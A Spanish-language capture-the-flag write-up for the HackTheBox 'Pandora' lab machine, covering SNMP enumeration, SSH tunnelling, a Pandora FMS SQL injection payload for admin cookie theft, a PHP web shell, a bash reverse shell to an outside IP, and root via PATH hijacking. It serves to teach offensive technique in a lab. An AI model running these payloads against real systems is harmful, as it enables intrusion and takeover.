---
layout: post
title: Pandora - WriteUp
author: WildZarek
permalink: /htb/pandora
excerpt: "Máquina Linux de dificultad fácil, en la que enumeraremos el servicio SNMP para leakear información del sistema, haremos port-forwarding para lograr acceso al panel de administración en el que nos aprovecharemos de SQL Injection. Finalmente lograremos ejecución remota de comandos en el panel y secuestraremos el PATH de un binario para escalar privilegios."
description: "Máquina Linux de dificultad fácil, en la que enumeraremos el servicio SNMP para leakear información del sistema, haremos port-forwarding para lograr acceso al panel de administración en el que nos aprovecharemos de SQL Injection. Finalmente lograremos ejecución remota de comandos en el panel y secuestraremos el PATH de un binario para escalar privilegios."
date: 2022-05-21
header:
  teaser: /assets/images/hackthebox/machines/pandora.png
  teaser_home_page: true
  icon: /assets/images/hackthebox/htb_icon_original.png
categories: [HackTheBox, Pentesting, Port Forwarding, Privilege Escalation]
tags: [UDP, SNMP, USER PIVOTING, PANDORA FMS, SQLI, CVE, COOKIE HIJACKING, RCE, PATH HIJACKING]
---

<p align="center"><img src="/assets/images/hackthebox/machines/pandora.png"></p>

## Fecha de Resolución

<a href="https://www.hackthebox.com/achievement/machine/18979/423">
  <img src="/assets/images/hackthebox/machines/pandora/pwned_date.png">
</a>

## Fase de Reconocimiento

Empezamos el reconocimiento de puertos lanzando un **`TCP SYN Port Scan`**

| Parámetro  | Descripción |
| ---------- | :---------- |
| -p-        | Escanea el rango completo de puertos (hasta el 65535)    |
| -sS        | Realiza un escaneo de tipo SYN port scan                 |
| --min-rate | Enviar paquetes no más lentos que 5000 por segundo       |
| --open     | Mostrar sólo los puertos que esten abiertos              |
| -vvv       | Triple verbose para ver en consola los resultados        |
| -n         | No efectuar resolución DNS                               |
| -Pn        | No efectuar descubrimiento de hosts                      |
| -oG        | Guarda el output en un archivo con formato grepeable para usar la función [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)

```console
p3ntest1ng:~$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.136 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 17:45 CEST
Initiating SYN Stealth Scan at 17:45
Scanning 10.10.11.136 [65535 ports]
SYN Stealth Scan Timing: About 50.00% done; ETC: 17:46 (0:00:44 remaining)
Discovered open port 22/tcp on 10.10.11.136
Discovered open port 80/tcp on 10.10.11.136
Completed SYN Stealth Scan at 17:47, 120.09s elapsed (65535 total ports)
Nmap scan report for 10.10.11.136
Host is up, received user-set (0.18s latency).
Scanned at 2022-05-20 17:45:02 CEST for 120s
Not shown: 52941 filtered tcp ports (no-response), 12592 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 120.33 seconds
           Raw packets sent: 124769 (5.490MB) | Rcvd: 12617 (505.620KB)
```

Identificamos los siguientes puertos abiertos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)** - SSH o Secure Shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Servidor_web)** - Servidor web      |

Vamos a obtener más información con un escaneo específico sobre los puertos que hemos encontrado.

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escanea sobre los puertos especificados                |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Determina la versión del servicio                      |
| -oN       | Guarda el output en un archivo con formato normal      |

```console
p3ntest1ng:~$ nmap -sCV -p 22,80 10.10.11.136 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 17:59 CEST
Nmap scan report for 10.10.11.136
Host is up (0.058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds
```

Analicemos el puerto **80** con un script de reconocimiento HTTP básico de nmap.

| Parámetro | Descripción |
| --------- | :---------- |
| --script  | Ejecución de scripts escritos en LUA. Usamos **http-enum** |
| -p        | Escanea sobre el puerto especificado                       |
| -oN       | Guarda el output en un archivo con formato normal          |

```console
p3ntest1ng:~$ nmap --script http-enum -p 80 10.10.11.136 -oN webScan

Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 18:01 CEST
Nmap scan report for 10.10.11.136
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 35.22 seconds
```

No encontramos nada así que podemos borrar el archivo **`webScan`** que nos ha generado Nmap. Comprobemos las tecnologías de la página web.

```console
p3ntest1ng:~$ whatweb http://10.10.11.136/
http://10.10.11.136/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.136], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]
```

En el resultado podemos ver dos direcciones de email, las anotamos por si nos sirven más adelante: **`contact@panda.htb`** y **`support@panda.htb`**
Modifiquemos nuestro archivo **`/etc/hosts`** para añadir el virtualhost **`panda.htb`**

```console
p3ntest1ng:~$ echo '10.10.11.136 panda.htb' | sudo tee -a /etc/hosts
```

Veamos qué encontramos con **`wfuzz`**, primero probamos un diccionario pequeño y si no encontramos nada, usamos uno más grande.

| Parámetro | Descripción |
| --------- | :---------- |
| -c        | Muestra el output en formato colorizado |
| -w        | Utiliza el diccionario especificado     |
| --hc 404  | Oculta todos los códigos de estado 404  |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc=404 http://panda.htb/FUZZ 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://panda.htb/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000001:   200        907 L    2081 W     33560 Ch    "http://panda.htb/"                                                                                        
000000013:   403        9 L      28 W       274 Ch      ".htpasswd"                                                                                                
000000011:   403        9 L      28 W       274 Ch      ".hta"                                                                                                     
000000012:   403        9 L      28 W       274 Ch      ".htaccess"                                                                                                
000000499:   301        9 L      28 W       307 Ch      "assets"                                                                                                   
000002020:   200        907 L    2081 W     33560 Ch    "index.html"                                                                                               
000003588:   403        9 L      28 W       274 Ch      "server-status"                                                                                            

Total time: 110.5806
Processed Requests: 4614
Filtered Requests: 4607
Requests/sec.: 41.72520
```

No hay mucho que nos sirva, lo siguiente que podemos hacer es verificar si existen subdominios en el virtualhost:

| Parámetro | Descripción |
| --------- | :---------- |
| -c        | Mostrar el output en formato colorizado              |
| -w        | Utiliza el diccionario especificado                  |
| --hc 404  | Oculta los códigos de estado 404                     |
| --hw 2081 | Oculta todos los resultados que tengan 2081 palabras |
| -H        | Realiza una consulta de tipo header                  |
| -u        | Especifica la URL para la consulta                   |
| -t        | Nos permite lanzar el comando con N threads          |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hw 2081 -H "Host: FUZZ.panda.htb" -u http://panda.htb/ -t 100 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://panda.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000009532:   400        10 L     35 W       301 Ch      "#www"                                                                                                     
000010581:   400        10 L     35 W       301 Ch      "#mail"                                                                                                    
000047706:   400        10 L     35 W       301 Ch      "#smtp"                                                                                                    
000103135:   400        10 L     35 W       301 Ch      "#pop3"                                                                                                    

Total time: 0
Processed Requests: 114441
Filtered Requests: 114437
Requests/sec.: 0
```

Hasta ahora no hemos encontrado ninguna información de utilidad, por lo tanto vamos a probar a realizar un escaneo de puertos **`UDP`**.

```console
p3ntest1ng:~$ sudo nmap -sU -T5 --top-ports 100 --open -v -n 10.10.11.136 -oG top100Ports_UDP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 18:45 CEST
Initiating Ping Scan at 18:45
Scanning 10.10.11.136 [4 ports]
Completed Ping Scan at 18:45, 0.16s elapsed (1 total hosts)
Initiating UDP Scan at 18:45
Scanning 10.10.11.136 [100 ports]
Warning: 10.10.11.136 giving up on port because retransmission cap hit (2).
Discovered open port 161/udp on 10.10.11.136
Completed UDP Scan at 18:45, 10.98s elapsed (100 total ports)
Nmap scan report for 10.10.11.136
Host is up (0.14s latency).
Not shown: 83 open|filtered udp ports (no-response), 16 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.39 seconds
           Raw packets sent: 309 (17.737KB) | Rcvd: 25 (2.264KB)
```

Bingo, descubrimos que el puerto **`161`** está abierto y que pertenece al protocolo **`SNMP`**

¿Qué es [SNMP](https://es.wikipedia.org/wiki/Protocolo_simple_de_administraci%C3%B3n_de_red)?
> El Protocolo simple de administración de red o SNMP (del inglés Simple Network Management Protocol) es un protocolo de la capa de aplicación que facilita el intercambio de información de administración entre dispositivos de red. Los dispositivos que normalmente soportan SNMP incluyen routers, switches, servidores, estaciones de trabajo, impresoras, bastidores de módem y muchos más.

Tras un rato buscando en Google, he encontrado un repositorio en Github para enumerar este protocolo: **https://github.com/ajohnston9/snmpenum**

## Fase de Explotación

Clonamos el repositorio en nuestra máquina y entramos en el directorio creado
> NOTA: También se encuentra disponible en los repositorios de Parrot, puedes instalarlo con **`sudo apt install snmpenum`**

```console
p3ntest1ng:~$ git clone https://github.com/ajohnston9/snmpenum
Clonando en 'snmpenum'...
remote: Enumerating objects: 8, done.
remote: Total 8 (delta 0), reused 0 (delta 0), pack-reused 8
Recibiendo objetos: 100% (8/8), listo.
p3ntest1ng:~$ cd snmpenum
p3ntest1ng:~$ ./snmpenum.pl
Usage: perl enum.pl <IP-address> <community> <configfile>
```

La ayuda del script es bastante escasa y tampoco hay mucha información en el repositorio del proyecto.
Necesitamos conocer cual es el "community string", para ello podemos utilizar la herramienta [onesixtyone](https://labs.portcullis.co.uk/tools/onesixtyone/)
que nos permite bruteforcear este valor en base a un archivo "communityfile" (ver ayuda del programa).

Para ahorrarnos este paso, vamos a considerar que normalmente el community string suele ser "public", así que vamos a probar:

```console
p3ntest1ng:~$ ./snmpenum.pl 10.10.11.136 public linux.txt
```

El output es bastante extenso así que os dejo sólo la información más interesante:

```console
sshd: daniel [priv]
/lib/systemd/systemd
(sd-pam)
sshd: daniel@pts/0
-bash
```

Descubrimos un usuario llamado **`daniel`** en el servicio SSH, lo tendremos en cuenta pero esto no nos sirve de mucho por ahora.
En los repositorios de Parrot existen más utilidades para tratar con este protocolo, yo voy a instalar el paquete **`snmp`** que incorpora varias utilidades.

```console
p3ntest1ng:~$ sudo apt install snmp
```

Una de las utilidades que incluye es [snmpwalk](https://hacking-etico.com/2014/03/27/leyendo-informacion-snmp-con-snmpwalk/):

| Parámetro | Descripción |
| --------- | :---------- |
| -c        | Establece la comunidad (COMMUNITY)         							|
| -v2c      | Establece la versión de SNMP (2c = SNMPv2) 							|
| -On       | Establece el formato para el output ( n = imprime OIDs numéricamente) |

```console
p3ntest1ng:~$ snmpwalk -c public -v2c -On 10.10.11.136 > pandora-dump.txt
```

Esta enumeración nos llevará algo de tiempo, por lo que tenemos que ser pacientes, o utilizar otra herramienta similar llamada **`snmpbulkwalk`** que agiliza el proceso.
De nuevo el output es muy denso y para no extender este documento más de lo necesario, os dejo lo más destacable:

```console
.1.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
.1.3.6.1.2.1.1.2.0 = OID: .1.3.6.1.4.1.8072.3.2.10
.1.3.6.1.2.1.1.3.0 = Timeticks: (453353) 1:15:33.53
.1.3.6.1.2.1.1.4.0 = STRING: "Daniel"
.1.3.6.1.2.1.1.5.0 = STRING: "pandora"
.1.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
.1.3.6.1.2.1.1.7.0 = INTEGER: 72
.1.3.6.1.2.1.1.8.0 = Timeticks: (28) 0:00:00.28
...[snip]...
.1.3.6.1.2.1.25.4.2.1.5.899 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
.1.3.6.1.2.1.25.4.2.1.5.908 = ""
.1.3.6.1.2.1.25.4.2.1.5.1116 = STRING: "-u daniel -p HotelBabylon23"
.1.3.6.1.2.1.25.6.3.1.2.586 = STRING: "mariadb-client-10.3_1:10.3.32-0ubuntu0.20.04.1_amd64"
.1.3.6.1.2.1.25.6.3.1.2.587 = STRING: "mariadb-client-core-10.3_1:10.3.32-0ubuntu0.20.04.1_amd64"
.1.3.6.1.2.1.25.6.3.1.2.588 = STRING: "mariadb-common_1:10.3.32-0ubuntu0.20.04.1_all"
.1.3.6.1.2.1.25.6.3.1.2.589 = STRING: "mariadb-server_1:10.3.32-0ubuntu0.20.04.1_all"
.1.3.6.1.2.1.25.6.3.1.2.590 = STRING: "mariadb-server-10.3_1:10.3.32-0ubuntu0.20.04.1_amd64"
.1.3.6.1.2.1.25.6.3.1.2.591 = STRING: "mariadb-server-core-10.3_1:10.3.32-0ubuntu0.20.04.1_amd64"
```

Tenemos las credenciales de la base de datos para el usuario **`daniel`**:**`HotelBabylon23`**. 
Probemos si hay reutilización de contraseñas tratando de conectarnos por SSH.

```console
p3ntest1ng:~$ sshpass -p "HotelBabylon23" ssh daniel@panda.htb
daniel@pandora:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
```

Vamos a listar todos los usuarios existentes:

```console
daniel@pandora:~$ grep -vE "nologin|false|sync|git" /etc/passwd | tr ":" " " | column -t
root    x  0     0     root          /root       /bin/bash
matt    x  1000  1000  matt          /home/matt  /bin/bash
daniel  x  1001  1001  /home/daniel  /bin/bash
```

Busquemos dónde se encuentra el archivo con la flag de usuario:

```console
daniel@pandora:~$ find / -type f -name user.txt 2>/dev/null
/home/matt/user.txt
daniel@pandora:~$ cat /home/matt/user.txt
cat: /home/matt/user.txt: Permission denied
```

Dado que el archivo está en el directorio de otro usuario, necesitamos encontrar la manera de pivotar hacia el usuario **`matt`**

Podemos comprobar si estamos en algún grupo interesante:

```console
daniel@pandora:~$ groups daniel
daniel : daniel
```

Nada interesante, probemos a listar los permisos a nivel de sudo:

```console
daniel@pandora:~$ sudo -l
[sudo] password for daniel: HotelBabylon23
Sorry, user daniel may not run sudo on pandora.
```

Veamos si existe algún binario con privilegios SUID que nos pueda servir para escalar privilegios más adelante:

```console
daniel@pandora:~$ cd / && find \-perm -4000 2>/dev/null
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/pandora_backup
./usr/bin/passwd
./usr/bin/mount
./usr/bin/su
./usr/bin/at
./usr/bin/fusermount
./usr/bin/chsh
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
```

Y efectivamente, tenemos un binario de nombre **`pandora_backup`** el cual vamos a analizar brevemente.

```console
daniel@pandora:/$ pandora_backup
-bash: /usr/bin/pandora_backup: Permission denied
```

No tenemos permisos de acceso, vamos a listar los permisos de forma más detallada:

```console
daniel@pandora:/$ ls -la /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
```

En este punto tampoco podemos hacer nada con este binario a menos que nos convirtamos en el usuario **`matt`**,
por lo tanto vamos enfocarnos en lo que sabemos hasta ahora. Existe un servicio web corriendo bajo el puerto 80,
normalmente este tipo de recursos tienen su directorio base en la ruta **`/var/www/`** así que vamos a revisar esto.

```console
daniel@pandora:~$ cd /var/www/ && ls
html  pandora
daniel@pandora:/var/www$ cd pandora && ls
index.html  pandora_console
daniel@pandora:~$ cd pandora_console && ls
ls
AUTHORS        Dockerfile  composer.json         extras   images        mobile                            pandora_console_logrotate_suse    pandoradb.sql       vendor
COPYING        ajax.php    composer.lock         fonts    include       operation                         pandora_console_logrotate_ubuntu  pandoradb_data.sql  ws.php
DB_Dockerfile  attachment  docker_entrypoint.sh  general  index.php     pandora_console.log               pandora_console_upgrade           tests
DEBIAN         audit.log   extensions            godmode  install.done  pandora_console_logrotate_centos  pandora_websocket_engine.service  tools
```

Listando los archivos de este directorio se observa la existencia de un archivo **`Dockerfile`** y otro **`DB_Dockerfile`**, veamos el contenido de este último.

```console
FROM mysql:5.5
MAINTAINER Pandora FMS Team <info@pandorafms.com>

WORKDIR /pandorafms/pandora_console

ADD pandoradb.sql /docker-entrypoint-initdb.d
ADD pandoradb_data.sql /docker-entrypoint-initdb.d
RUN chown mysql /docker-entrypoint-initdb.d

ENV MYSQL_DATABASE=pandora

RUN echo " \n\
sed -i \"1iUSE \$MYSQL_DATABASE\" /docker-entrypoint-initdb.d/pandoradb.sql \n\
sed -i \"1iUSE \$MYSQL_DATABASE\" /docker-entrypoint-initdb.d/pandoradb_data.sql \n\
" >> /docker-entrypoint-initdb.d/create_pandoradb.sh 
```

Tenemos en este directorio un script en bash de nombre **`docker_entrypoint.sh`** (que coincide con los datos de arriba), veamos el contenido.

```console
daniel@pandora:~$ cat docker_entrypoint.sh 
#!/bin/bash
...[snip]...
mv -f /tmp/pandorafms/pandora_console /var/www/html
cd /var/www/html/pandora_console/include
cat > config.php <<- 'EOF'
<?php
$config["dbtype"] = "mysql";
$config["homedir"]="/var/www/html/pandora_console";     // Config homedir
$config["homeurl"]="/pandora_console";                  // Base URL
$config["homeurl_static"]="/pandora_console";           // Don't  delete
error_reporting(E_ALL);
$ownDir = dirname(__FILE__) . DIRECTORY_SEPARATOR;
EOF

echo "\$config[\"dbname\"]=\"$PANDORA_DB_NAME\";" >> config.php
echo "\$config[\"dbuser\"]=\"$PANDORA_DB_USER\";" >> config.php
echo "\$config[\"dbpass\"]=\"$PANDORA_DB_PASSWORD\";" >> config.php
echo "\$config[\"dbhost\"]=\"$PANDORA_DB_HOST\";" >> config.php
echo "include (\$ownDir . \"config_process.php\");" >> config.php
echo "?>" >> config.php

echo "Granting apache permissions to the console directory"
chown -R apache:apache /var/www/html/pandora_console
chmod 600 /var/www/html/pandora_console/include/config.php

# Customize php.iniA
echo "Configuring Pandora FMS elements and depending services"
sed "s/.*error_reporting =.*/error_reporting = E_ALL \& \~E_DEPRECATED \& \~E_NOTICE \& \~E_USER_WARNING/" /etc/php.ini > /tmp/php.ini && mv /tmp/php.ini /etc/php.ini
sed "s/.*max_execution_time =.*/max_execution_time = 0/" /etc/php.ini > /tmp/php.ini && mv /tmp/php.ini /etc/php.ini
sed "s/.*max_input_time =.*/max_input_time = -1/" /etc/php.ini > /tmp/php.ini && mv /tmp/php.ini /etc/php.ini
sed "s/.*upload_max_filesize =.*/upload_max_filesize = 800M/" /etc/php.ini > /tmp/php.ini && mv /tmp/php.ini /etc/php.ini
sed "s/.*memory_limit =.*/memory_limit = 500M/" /etc/php.ini > /tmp/php.ini && mv /tmp/php.ini /etc/php.ini
sed "s/.*post_max_size =.*/post_max_size = 100M/" /etc/php.ini > /tmp/php.ini && mv /tmp/php.ini /etc/php.ini

cd /var/www/html/pandora_console && mv -f install.php install.php.done

#Create the pandora user
/usr/sbin/useradd -d /home/pandora -s /bin/false -M -g 0 pandora

#Rock n' roll!
/etc/init.d/crond start &
/etc/init.d/ntpd start &

rm -rf /run/httpd/*
exec /usr/sbin/apachectl -D FOREGROUND
```

Vemos que se están realizando varias operatorias sobre los archivos **`config.php`**, **`php.ini`** y algunos directorios.
Este script nos da indicios de que existe una consola para un panel llamado Pandora.
Dado que no tenemos acceso desde el exterior, vamos a levantar un túnel hacia este recurso con ayuda de **`SSH`**:

```console
p3ntest1ng:~$ sudo ssh daniel@panda.htb -L 80:127.0.0.1:80

The authenticity of host 'panda.htb (10.10.11.136)' can't be established.
ECDSA key fingerprint is SHA256:9urFJN3aRYRRc9S5Zc+py/w4W6hmZ+WLg6CyrY+5MDI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'panda.htb,10.10.11.136' (ECDSA) to the list of known hosts.
daniel@panda.htb's password: HotelBabylon23
...[snip]...
daniel@pandora:~$ 
```

Con esto, ahora deberíamos ser capaces de ver el panel que antes no podíamos ver ya que sólo estaba disponible de forma local:

![Pandora](/assets/images/hackthebox/machines/pandora/console.png)

Abajo del todo vemos la versión del CMS: **`v7.0NG.742_FIX_PERL2020`** y realizando una búsqueda en Google, encontramos que es vulnerable a **`SQL Injection`**

![CVE1](/assets/images/hackthebox/machines/pandora/cve1.png)

> [https://github.com/TheCyberGeek/CVE-2020-5844](https://github.com/TheCyberGeek/CVE-2020-5844)

En Google se encuentran diversos artículos explicando las vulnerabilidades de este CMS,
nosotros vamos a centrarnos en aplicar un **`Unauthenticated SQL Injection`** (CVE-2021-32099).

Pero primero vamos a verificar el SQL Injection:

![UnAuth SQLI](/assets/images/hackthebox/machines/pandora/unauth_sqli.png)

![SQLI Success](/assets/images/hackthebox/machines/pandora/sqli.png)

Analicemos el siguiente exploit: [https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)

En el código vemos cómo se hace la consulta para obtener la cookie de sesión del usuario administrador:

![SQLI Cookie](/assets/images/hackthebox/machines/pandora/sqli_cookie.png)

Ejecutando esta consulta sobre el servidor web (en este caso sobre nuestro localhost, gracias al port forwarding), podemos obtener la cookie:

![Get Cookie](/assets/images/hackthebox/machines/pandora/get_cookie.png)

```
http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
```

Teniendo la cookie del admin, podemos inyectarla en una petición usando el parámetro **`session_id`**
```
http://localhost/pandora_console/include/chart_generator.php?session_id=nvccpkpgo3sq1i9g333v3vp6it
```

Si recargamos la página con F5, deberíamos haber logrado acceso como administrador al panel:

![Admin](/assets/images/hackthebox/machines/pandora/admin.png)

Analizando el código del exploit vemos que posteriormente a obtener la cookie del admin, se intenta subir un archivo.
Esto es posible dado que en el CMS tenemos varias herramientas como administradores, entre ellas un File Manager.

![File Manager](/assets/images/hackthebox/machines/pandora/filemanager.png)

![Upload File](/assets/images/hackthebox/machines/pandora/uploadfile.png)

Pues sabiendo todo esto, vamos a subir nuestra web shell en PHP para poder ejecutar comandos.

```php
<?php>
  echo "<pre>" . shell_exec($_REQUESTS['cmd']) . "</pre>";
<?>
```

![Uploading](/assets/images/hackthebox/machines/pandora/uploading.png)

![Success](/assets/images/hackthebox/machines/pandora/success.png)

![Uploaded](/assets/images/hackthebox/machines/pandora/uploaded.png)

Ahora simplemente vamos a la dirección donde se encuentra nuestro archivo php y ya podemos ejecutar comandos.

![RCE](/assets/images/hackthebox/machines/pandora/rce.png)

Vamos a entablar una conexión inversa hacia nuestra máquina para mayor comodidad y operar con una shell:

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.40/9999 0>&1"
```

Antes de enviar el comando con la webshell, nos ponemos en escucha con netcat:

```console
p3ntest1ng:~$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.16.40] from (UNKNOWN) [10.10.11.136] 42428
bash: cannot set terminal process group (859): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console/images$ 
```

Es conveniente realizar un tratamiento a esta shell para tener una tty completa:

```console
matt@pandora:/var/www/pandora/pandora_console/images$ script /dev/null -c bash
Script started, file is /dev/null
matt@pandora:/var/www/pandora/pandora_console/images$ ^Z
zsh: suspended  nc -nlvp 9999
p3ntest1ng:~$ stty raw -echo; fg
[1]  + continued  nc -nlvp 9999
                               reset xterm
matt@pandora:/var/www/pandora/pandora_console/images$ export TERM=xterm
matt@pandora:/var/www/pandora/pandora_console/images$ export SHELL=bash
matt@pandora:/var/www/pandora/pandora_console/images$ stty rows 36 columns 172
matt@pandora:/var/www/pandora/pandora_console/images$ cd /home
matt@pandora:/home$ cd matt
matt@pandora:/home/matt$ ls
user.txt
matt@pandora:/home/matt$ cat user.txt
060462bb4a8c091745340959b3def569
```

## Escalada de Privilegios

Antes de nada vamos a generar un par de claves SSH para poder acceder como el usuario **`matt`** sin proporcionar contraseña.

```console
matt@pandora:/home/matt$ mkdir .ssh && cd !$
matt@pandora:/home/matt/.ssh$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/matt/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:apb9roxhxj8rmdpFRA+NcD+alfDFtheZT14rxHgH8qk matt@pandora
The key's randomart image is:
+---[RSA 3072]----+
|      ..=o o+..o |
|       o.*.+=+=.o|
|        . B.o+.=o|
|       . + .o...o|
|        S  E ..  |
|     . =         |
|      Xoo        |
|     *+*..       |
|    ..o.==o      |
+----[SHA256]-----+
matt@pandora:/home/matt/.ssh$ cp id_rsa.pub authorized_keys
matt@pandora:/home/matt/.ssh$ chmod 600 authorized_keys
```

Copiamos el contenido del archivo **`id_rsa`**, lo creamos en nuestra máquina y le asignamos los permisos adecuados.
Finalmente, ya podemos conectarnos por SSH con la clave que hemos generado.

```console
p3ntest1ng:~$ ssh -i id_rsa matt@panda.htb
...[snip]...
matt@pandora:~$ echo $TERM
xterm-256color
matt@pandora:~$ export TERM=xterm
```

Anteriormente vimos que existe un binario con permisos SUID que podemos ejecutar siendo el usuario **`matt`**, veamos qué hace.

```console
matt@pandora:~$ which ltrace
/usr/bin/ltrace
matt@pandora:~$ ltrace /usr/bin/pandora_backup
getuid()                                                       = 1000
geteuid()                                                      = 1000
setreuid(1000, 1000)                                           = 0
puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
)                                                              = 26
puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
)                                                              = 43
system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                         = 512
puts("Backup failed!\nCheck your permis"...Backup failed!
Check your permissions!
)                                                              = 39
+++ exited (status 1) +++
```

Por lo que vemos en este output, el binario en cuestión utiliza la herramienta **`tar`** para comprimir los archivos sobre los que trabaja.
El problema en este punto es que se hace una llamada relativa al binario **`tar`**, y podemos aprovecharnos de esto para realizar **`PATH Hijacking`**,
de forma que suplantamos el archivo al que apunta para lograr ejecutar comandos privilegiados.

```console
matt@pandora:~$ cd /tmp
matt@pandora:/tmp$ touch tar
matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ which sh | xargs > tar
matt@pandora:/tmp$ cat tar
/usr/bin/sh
matt@pandora:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:/tmp$ export PATH=/tmp:$PATH
matt@pandora:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:/tmp$ pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
# whoami
root
# bash
root@pandora:~# cat /root/root.txt
e022c509e40ddca23ad52ddde3b3c978
```

### ¡Gracias por leer hasta el final!

#### Nos vemos en un próximo. ¡Feliz hacking! ☠